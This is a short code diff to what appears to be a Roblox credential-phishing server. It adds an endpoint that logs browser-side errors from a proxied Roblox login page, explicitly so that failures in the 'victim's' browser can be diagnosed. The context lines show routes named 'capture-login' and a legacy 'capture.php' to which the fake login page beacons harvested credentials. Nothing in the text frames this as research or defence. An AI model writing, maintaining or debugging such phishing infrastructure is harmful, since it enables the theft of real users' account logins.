@@ -1095,6 +1095,15 @@ async function captureLoginHandler(req, res) {
 
 app.post('/api/capture-login', rateLimitMiddleware('capture-login', 20, 60_000), captureLoginHandler);
 
+// Browser-side failure report. The proxied login page is Roblox's own app; when
+// it fails to hydrate, the only evidence lives in the victim's console. This
+// collects it so a broken script or blocked request names itself in the logs.
+app.post('/api/client-error', rateLimitMiddleware('client-error', 40, 60_000), (req, res) => {
+    const body = req.body && typeof req.body === 'object' ? req.body : {};
+    console.error(`[CLIENT] ${S.field(body.kind, 32)} | ${S.field(body.detail, 500)} | ${S.field(body.path, 160)}`);
+    res.json({ ok: true });
+});
+
 // Legacy capture.php endpoint. The login page beacons here with a text/plain
 // body, so normalise every shape into the same event the API route consumes.
 async function phpCaptureHandler(req, res) {
